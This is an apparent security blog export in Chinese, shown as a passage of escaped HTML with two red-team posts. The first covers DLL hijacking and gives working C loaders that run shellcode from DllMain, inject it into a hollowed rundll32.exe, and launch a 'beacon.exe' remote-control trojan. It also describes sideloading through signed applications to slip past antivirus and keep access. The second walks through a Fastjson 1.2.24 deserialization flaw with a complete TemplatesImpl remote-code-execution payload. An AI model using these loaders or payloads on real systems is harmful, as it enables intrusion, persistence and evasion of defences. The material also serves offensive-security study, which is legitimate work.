hMod;</span><br><span class=\"line\">            break;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">VOID DllHijack(HMODULE hMod)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    TCHAR tszDllPath[MAX_PATH] &#x3D; &#123; 0 &#125;;</span><br><span class=\"line\"> </span><br><span class=\"line\">    GetModuleFileName(hMod, tszDllPath, MAX_PATH);</span><br><span class=\"line\">    PathRemoveFileSpec(tszDllPath);</span><br><span class=\"line\">    PathAppend(tszDllPath, TEXT(&quot;mydll.dll.1&quot;));</span><br><span class=\"line\"> </span><br><span class=\"line\">    HMODULE hMod1 &#x3D; LoadLibrary(tszDllPath);</span><br><span class=\"line\"> </span><br><span class=\"line\">    SuperDllHijack(L&quot;mydll.dll&quot;, hMod1);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class=\"line\">                       DWORD  ul_reason_for_call,</span><br><span class=\"line\">                       LPVOID lpReserved</span><br><span class=\"line\">                     )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    switch (ul_reason_for_call)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    case DLL_PROCESS_ATTACH:</span><br><span class=\"line\">        DllHijack(hModule);</span><br><span class=\"line\">        break;</span><br><span class=\"line\">    case DLL_THREAD_ATTACH:</span><br><span class=\"line\">    case DLL_THREAD_DETACH:</span><br><span class=\"line\">    case DLL_PROCESS_DETACH:</span><br><span class=\"line\">        break;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return TRUE;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>但是本地库函里参数变更，没法实验。</p>\n<h1 id=\"实际利用\"><a href=\"#实际利用\" class=\"headerlink\" title=\"实际利用\"></a>实际利用</h1><h2 id=\"白加黑\"><a href=\"#白加黑\" class=\"headerlink\" title=\"白加黑\"></a>白加黑</h2><p>杀软在检测一个应用是否为病毒的时候，首先会通过黑白名单校验-病毒特征库查询-上传云查杀，在黑白名单校验阶段，如果是白名单中的应用则可以成功运行，白名单也就是有数字签名的应用，我们可以通过修改有数字签名应用中的dll，当该应用启动时会调用该dll，从而执行恶意代码。</p>\n<h2 id=\"DLL加载上线\"><a href=\"#DLL加载上线\" class=\"headerlink\" title=\"DLL加载上线\"></a>DLL加载上线</h2><p>生成shellcode</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823233332667.png\" alt=\"image-20220823233332667\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 入口函数</span><br><span class=\"line\">BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (dwReason &#x3D;&#x3D; DLL_PROCESS_ATTACH)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        DisableThreadLibraryCalls(hModule);</span><br><span class=\"line\">        unsigned char buf[] &#x3D; &quot;shellcode&quot;;</span><br><span class=\"line\">        size_t size &#x3D; sizeof(buf);</span><br><span class=\"line\">        char* inject &#x3D; (char *)VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">        memcpy(inject, buf, size);</span><br><span class=\"line\">        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)inject, 0, 0, 0);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else if (dwReason &#x3D;&#x3D; DLL_PROCESS_DETACH)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return TRUE;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>没做免杀，会报毒，而且这里利用线程去加载shellcode，当qq退出时就会下线，通过dll注入技术，注入迁移到其他进程</p>\n<p><a href=\"https://www.freebuf.com/articles/web/325873.html\">深入理解反射式dll注入技术 - FreeBuf网络安全行业门户</a></p>\n<p><a href=\"https://blog.csdn.net/Cody_Ren/article/details/100053434\">DLL注入的8种姿势_dajiiii的博客dll注入</a></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/LZAGGX%5B0N5%7BTFV4YS%5BEO$S0.png\" alt=\"img\"></p>\n<p>这里借鉴一下其他师傅的注入代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 入口函数</span><br><span class=\"line\">BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tif (dwReason &#x3D;&#x3D; DLL_PROCESS_ATTACH)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tDisableThreadLibraryCalls(hModule);</span><br><span class=\"line\">\t\tunsigned char hexData[] &#x3D; &quot;(shellcode)&quot;;</span><br><span class=\"line\">\t\tchar* v7A &#x3D; (char*)VirtualAlloc(0, _countof(hexData),0x3000u, 0x40u);</span><br><span class=\"line\">\t\tmemcpy((void*)v7A, hexData, _countof(hexData));</span><br><span class=\"line\">\t\tstruct _PROCESS_INFORMATION ProcessInformation;</span><br><span class=\"line\">\t\tstruct _STARTUPINFOA StartupInfo;</span><br><span class=\"line\">\t\tvoid* v24;</span><br><span class=\"line\">\t\tCONTEXT Context;</span><br><span class=\"line\">\t\tDWORD DwWrite &#x3D; 0;</span><br><span class=\"line\">\t\tmemset(&amp;StartupInfo, 0, sizeof(StartupInfo));</span><br><span class=\"line\">\t\tStartupInfo.cb &#x3D; 68;</span><br><span class=\"line\">\t\tBOOL result &#x3D; CreateProcessA(0,(LPSTR)&quot;rundll32.exe&quot;, 0, 0, 0, 0x44u, 0, 0, &amp;StartupInfo,&amp;ProcessInformation);</span><br><span class=\"line\">\t\tif (result)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tContext.ContextFlags &#x3D; 65539;</span><br><span class=\"line\">\t\t\tGetThreadContext(ProcessInformation.hThread, &amp;Context);</span><br><span class=\"line\">\t\t\tv24 &#x3D; VirtualAllocEx(ProcessInformation.hProcess, 0, _countof(hexData), 0x1000u, 0x40u);</span><br><span class=\"line\">\t\t\tWriteProcessMemory(ProcessInformation.hProcess, v24, v7A, _countof(hexData), &amp;DwWrite);</span><br><span class=\"line\">\t\t\tContext.Eip &#x3D; (DWORD)v24;</span><br><span class=\"line\">\t\t\tSetThreadContext(ProcessInformation.hThread, &amp;Context);</span><br><span class=\"line\">\t\t\tResumeThread(ProcessInformation.hThread);</span><br><span class=\"line\">\t\t\tCloseHandle(ProcessInformation.hThread);</span><br><span class=\"line\">\t\t\tresult &#x3D; CloseHandle(ProcessInformation.hProcess);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse if (dwReason &#x3D;&#x3D; DLL_PROCESS_DETACH)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn TRUE;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>注入成功，关闭QQ也可达到权限维持目的</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220824010754724.png\" alt=\"image-20220824010754724\"></p>\n<p>而且shellcode没有做免杀竟然没有报毒</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220824012022017.png\" alt=\"image-20220824012022017\"></p>\n<p>还有搭配图片的，项目地址：<a href=\"https://github.com/Mr-Un1k0d3r/DKMC\">DKMC - Dont kill my cat - Malicious payload evasion tool</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 入口函数</span><br><span class=\"line\">BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tif (dwReason &#x3D;&#x3D; DLL_PROCESS_ATTACH)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tDisableThreadLibraryCalls(hModule);</span><br><span class=\"line\">\t\tFILE* fp; &#x2F;&#x2F; 定义流式文件操作变量fp，FILE结构体在stdio.h里面有定义</span><br><span class=\"line\">\t\tsize_t size; &#x2F;&#x2F; 定义文件字节数变量size</span><br><span class=\"line\">\t\tunsigned char* buffer; &#x2F;&#x2F; 定义缓存指针变量</span><br><span class=\"line\">\t\tfp &#x3D; fopen(&quot;cloudmusic.bmp&quot;, &quot;rb&quot;);&#x2F;&#x2F; fseek()负号前移，正号后移</span><br><span class=\"line\">\t\tfseek(fp, 0, SEEK_END); &#x2F;&#x2F; 文件指针指向文件末尾</span><br><span class=\"line\">\t\t&#x2F;&#x2F; ftell()返回给定流 stream 的当前文件位置</span><br><span class=\"line\">\t\tsize &#x3D; ftell(fp); &#x2F;&#x2F; size值为文件大小</span><br><span class=\"line\">\t\tfseek(fp, 0, SEEK_SET); &#x2F;&#x2F; 文件指针指向文件开头</span><br><span class=\"line\">\t\tbuffer &#x3D; (unsigned char*)malloc(size); &#x2F;&#x2F; 动态申请图片大小的内存空间（数组指针）</span><br><span class=\"line\">\t\tfread(buffer, size, 1, fp); &#x2F;&#x2F; 从fp读取和显示1个size大小的数据</span><br><span class=\"line\">\t\tchar* v7A &#x3D; (char*)VirtualAlloc(0, _countof(hexData),0x3000u, 0x40u);</span><br><span class=\"line\">\t\tmemcpy((void*)v7A, hexData, _countof(hexData));</span><br><span class=\"line\">\t\tstruct _PROCESS_INFORMATION ProcessInformation;</span><br><span class=\"line\">\t\tstruct _STARTUPINFOA StartupInfo;</span><br><span class=\"line\">\t\tvoid* v24;</span><br><span class=\"line\">\t\tCONTEXT Context;</span><br><span class=\"line\">\t\tDWORD DwWrite &#x3D; 0;</span><br><span class=\"line\">\t\tmemset(&amp;StartupInfo, 0, sizeof(StartupInfo));</span><br><span class=\"line\">\t\tStartupInfo.cb &#x3D; 68;</span><br><span class=\"line\">\t\tBOOL result &#x3D; CreateProcessA(0,(LPSTR)&quot;rundll32.exe&quot;, 0, 0, 0, 0x44u, 0, 0, &amp;StartupInfo,&amp;ProcessInformation);</span><br><span class=\"line\">\t\tif (result)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tContext.ContextFlags &#x3D; 65539;</span><br><span class=\"line\">\t\t\tGetThreadContext(ProcessInformation.hThread, &amp;Context);</span><br><span class=\"line\">\t\t\tv24 &#x3D; VirtualAllocEx(ProcessInformation.hProcess, 0, _countof(hexData), 0x1000u, 0x40u);</span><br><span class=\"line\">\t\t\tWriteProcessMemory(ProcessInformation.hProcess, v24, v7A, _countof(hexData), &amp;DwWrite);</span><br><span class=\"line\">\t\t\tContext.Eip &#x3D; (DWORD)v24;</span><br><span class=\"line\">\t\t\tSetThreadContext(ProcessInformation.hThread, &amp;Context);</span><br><span class=\"line\">\t\t\tResumeThread(ProcessInformation.hThread);</span><br><span class=\"line\">\t\t\tCloseHandle(ProcessInformation.hThread);</span><br><span class=\"line\">\t\t\tresult &#x3D; CloseHandle(ProcessInformation.hProcess);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse if (dwReason &#x3D;&#x3D; DLL_PROCESS_DETACH)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn TRUE;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"文件关联程序DLL劫持\"><a href=\"#文件关联程序DLL劫持\" class=\"headerlink\" title=\"文件关联程序DLL劫持\"></a>文件关联程序DLL劫持</h2><p>挖掘默认文件相关联应用程序存不存在dll劫持，比如打开图片，默认为某种看图软件，当双击图片便加载dll</p>\n<h2 id=\"加载exe\"><a href=\"#加载exe\" class=\"headerlink\" title=\"加载exe\"></a>加载exe</h2><p>上传一个exe(做好免杀)，dll加载去执行远控木马</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 入口函数</span><br><span class=\"line\">BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (dwReason &#x3D;&#x3D; DLL_PROCESS_ATTACH)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        DisableThreadLibraryCalls(hModule);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else if (dwReason &#x3D;&#x3D; DLL_PROCESS_DETACH)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        STARTUPINFO si &#x3D; &#123; sizeof(si) &#125;;</span><br><span class=\"line\">        PROCESS_INFORMATION pi;</span><br><span class=\"line\">        CreateProcess(TEXT(&quot;C:\\\\Users\\\\win7\\\\Desktop\\\\shellcode\\\\beacon.exe&quot;), NULL, NULL, NULL, false, 0, NULL, NULL, &amp;si, &amp;pi);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    return TRUE;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"权限提升\"><a href=\"#权限提升\" class=\"headerlink\" title=\"权限提升\"></a>权限提升</h2><p>这部分就是关于windows提权中的设置，感觉多是一些CVE等。</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>文章-基础</p>\n<ul>\n<li><a href=\"https://www.anquanke.com/post/id/225911\">DLL劫持原理及其漏洞挖掘（一）</a></li>\n<li><a href=\"https://yanghaoi.github.io/2021/11/18/dll-jie-chi-lou-dong/\">DLL劫持漏洞 | Yang Hao’s blog</a></li>\n<li><a href=\"https://www.cnblogs.com/lidabo/archive/2013/11/20/3434005.html\">DLL编写教程(绝对经典之作)</a></li>\n</ul>\n<p>文章-提升</p>\n<ul>\n<li><a href=\"https://www.anquanke.com/post/id/232891\">DLL劫持之权限维持篇（二）</a></li>\n<li><a href=\"https://bbs.pediy.com/thread-248050.htm\">一种通用DLL劫持技术研究</a></li>\n<li><a href=\"https://xz.aliyun.com/t/10143\">golang实现dll恶意劫持转发</a></li>\n</ul>\n<p>视频</p>\n<ul>\n<li><a href=\"https://www.bilibili.com/video/BV1S4411e7Mc\">https://www.bilibili.com/video/BV1S4411e7Mc</a></li>\n</ul>\n<p>Attack</p>\n<ul>\n<li><a href=\"http://payloads.online/archivers/2018-06-09/1/\">QQ拼音输入法6.0最新版DLL劫持 - 可利用于提权</a></li>\n<li><a href=\"http://payloads.online/archivers/2018-08-15/1/\">Microsoft DirectX SDK June 2010 Xact3.exe DLL Hijacking复现</a></li>\n</ul>\n<p>用到的工具</p>\n<ul>\n<li>Rattler</li>\n<li>Aheadlib</li>\n</ul>\n","categories":["Red-Team"]},{"title":"Fastjson1.22-1.24反序列化之TemplateImpl","url":"/2023/12/25/FastJson(%E4%B8%80)/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>初探FastJson，version = 1.2.24</p>\n<h1 id=\"FastJson\"><a href=\"#FastJson\" class=\"headerlink\" title=\"FastJson\"></a>FastJson</h1><p>Fastjson是Alibaba开发的Java语言编写的高性能 JSON 库，用于将数据在 <strong>JSON 和 Java Object</strong> 之间互相转换，提供两个主要接口 <strong>JSON.toJSONString</strong> 和 <strong>JSON.parseObject/JSON.parse</strong> 来分别实现序列化和反序列化操作。</p>\n<a id=\"more\"></a>\n\n<h1 id=\"Demo\"><a href=\"#Demo\" class=\"headerlink\" title=\"Demo\"></a>Demo</h1><p>添加环境</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;1.2.24&lt;&#x2F;version&gt;</span><br><span class=\"line\">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure>\n\n<p>Person类</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Person</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String name;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Map age;</span><br><span class=\"line\"></span><br><span class=\"line\">    Person()&#123;&#125;;</span><br><span class=\"line\">    Person(String name)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">setName</span><span class=\"params\">(String name)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;setName invoke&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">getName</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;getName invoke&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Map <span class=\"title\">getAge</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;getAge invoke&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> HashMap();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Demo类</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.JSON;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">fastjsonDemo</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//Map类型</span></span><br><span class=\"line\">        HashMap&lt;Object, Object&gt; map = <span class=\"keyword\">new</span> HashMap&lt;Object, Object&gt;();</span><br><span class=\"line\">        map.put(<span class=\"string\">&quot;key1&quot;</span>,<span class=\"string\">&quot;value1&quot;</span>);</span><br><span class=\"line\">        map.put(<span class=\"string\">&quot;key2&quot;</span>,<span class=\"string\">&quot;value2&quot;</span>);</span><br><span class=\"line\">        String mapJson1 = JSON.toJSONString(map);</span><br><span class=\"line\">        String mapJson2 = JSON.toJSONString(map,SerializerFeature.WriteClassName);</span><br><span class=\"line\">        System.out.println(mapJson1);</span><br><span class=\"line\">        System.out.println(mapJson2);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//序列化</span></span><br><span class=\"line\">        Person person = <span class=\"keyword\">new</span> Person(<span class=\"string\">&quot;Y0ng&quot;</span>,<span class=\"number\">20</span>);</span><br><span class=\"line\">        String PersonJson1 = JSON.toJSONString(person);</span><br><span class=\"line\">        String PersonJson2 = JSON.toJSONString(person, SerializerFeature.WriteClassName);</span><br><span class=\"line\"></span><br><span class=\"line\">        System.out.println(PersonJson1);</span><br><span class=\"line\">        System.out.println(PersonJson2);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//通过parse方法进行反序列化</span></span><br><span class=\"line\">        Person Unperson = (Person) JSON.parse(PersonJson2);</span><br><span class=\"line\">        System.out.println(Unperson.getName());</span><br><span class=\"line\">        System.out.println();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//通过parseObject方法进行反序列化  通过这种方法返回的是一个JSONObject</span></span><br><span class=\"line\">        Object obj = JSON.parseObject(PersonJson2);</span><br><span class=\"line\">        System.out.println(obj);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;obj name:&quot;</span>+obj.getClass().getName()+<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//通过这种方式返回的是一个相应的类对象</span></span><br><span class=\"line\">        Object obj1 = JSON.parseObject(PersonJson2,Object.class);</span><br><span class=\"line\">        System.out.println(obj1);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;obj1 name:&quot;</span>+obj1.getClass().getName());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在序列化时加上 <strong>SerializerFeature.WriteClassName</strong> 这个参数值，会在序列化时写入一个 <code>@type</code> ，用来指定序列化的类的类型，后面是其属性名和值。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/47cc5cf56eaef4d5c9b8ab3388e2e44a.png\" alt=\"image-20220310152515276\"></p>\n<p>FastJson利用 <strong>toJSONString</strong> 方法来序列化对象，而反序列化还原回 <strong>Object</strong> 的方法，有三个，分别是</p>\n<ul>\n<li> <strong>JSON.parseObject()</strong></li>\n<li> <strong>JSON.parse()</strong> </li>\n<li><strong>JSON.parseArray()</strong></li>\n</ul>\n<p>前两个最主要的区别就是 <strong>parseObject</strong> 返回的是 <strong>JSONObject</strong> 而 <strong>parse</strong> 返回的是实际类型的对象，当在没有对应类的定义的情况下，通常情况下都会使用 <strong>JSON.parseObject</strong> 来获取数据。</p>\n<blockquote>\n<p>parse 他会去优先去匹配调用字段的set方法，如果没有set方法，就会去寻找字段的get方法(有条返回值要是Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong，这就是TemplatesImpl调用链的触发原因)</p>\n<p>parseObject会调用set与get方法</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/b5c40ff0a06a5433cc827c1ef50863bf.png\" alt=\"image-20220315000730650\"></p>\n<h1 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h1><p><strong>使用 SerializerFeature.WriteClassName 时</strong> 会在序列化中写入当前的 <strong>type</strong>， <strong>@type</strong> 可以 <strong>指定反序列化任意类</strong>，<strong>调用其set，get，is方法</strong>。而问题恰恰出现在了这个特性，我们可以配合一些存在问题的类，然后继续操作，造成RCE的问题</p>\n<h1 id=\"流程跟进\"><a href=\"#流程跟进\" class=\"headerlink\" title=\"流程跟进\"></a>流程跟进</h1><p>以 TemplatesImpl 加载字节码为例子分析</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.JSON;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">fastjsonDemo</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        String payload = <span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\&quot;,\\&quot;_bytecodes\\&quot;:[\\&quot;yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAKcG9jXzEuamF2YQwACAAJBwAhDAAiACMBAARjYWxjDAAkACUBAAVwb2NfMQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAsAAAAOAAMAAAAJAAQACgANAAsADAAAAAQAAQANAAEADgAPAAEACgAAABkAAAAEAAAAAbEAAAABAAsAAAAGAAEAAAAOAAEADgAQAAIACgAAABkAAAADAAAAAbEAAAABAAsAAAAGAAEAAAARAAwAAAAEAAEAEQAJABIAEwACAAoAAAAlAAIAAgAAAAm7AAVZtwAGTLEAAAABAAsAAAAKAAIAAAATAAgAFAAMAAAABAABABQAAQAVAAAAAgAW\\&quot;],&#x27;_name&#x27;:&#x27;c.c&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\\&quot;_outputProperties\\&quot;:&#123;&#125;,\\&quot;_name\\&quot;:\\&quot;a\\&quot;,\\&quot;_version\\&quot;:\\&quot;1.0\\&quot;,\\&quot;allowedProtocols\\&quot;:\\&quot;all\\&quot;&#125;&quot;</span>;</span><br><span class=\"line\">        JSON.parseObject(payload, Feature.SupportNonPublicField);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/0145e46c1f7c526813654e24ccd185f1.png\" alt=\"image-20220317205210459\"></p>\n<p>跟进</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/e67e2da0714a35478bf2fdc8ac7fedb8.png\" alt=\"image-20220317205423541\"></p>\n<p>接着调用parse</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/1dec53bb9ad6d181de2c5494b40a4ee2.png\" alt=\"image-20220317205759624\"></p>\n<p>发现 JSON#parse() 种实例化 DefaultJSONParser 类 并调用 DefaultJSONParser#parse()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/2eff941da40e3e5a19f166a674c6e5d9.png\" alt=\"image-20220317205852093\"></p>\n<p>可以看到传入的还有黑名单 ParserConfig#getGlobalInstance()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/5b3336fd5022a66879980480a08529a5.png\" alt=\"image-20220317210104781\"></p>\n<p>先跟入实例化过程,调用了 JSONScanner()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/18fea6c9c770e01018f8cac30be9b620.png\" alt=\"image-20220317210152569\"></p>\n<p>跟进 JSONScanner#JSONScanner() 就是获取输入长度 调用next()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/2f2472d77bb601a3d5e11777f13e6775.png\" alt=\"image-20220317210307649\"></p>\n<p>next() 就是字符串扫描</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/7833d1ec42fbd90fd57ab7de43b3939a.png\" alt=\"image-20220317210502178\"></p>\n<p>回到 DefaultJSONParser 实例化过程，lexer 就是上一步传入实例化的 JSONScanner，ch 通过getCurrent()获得首个字符 即 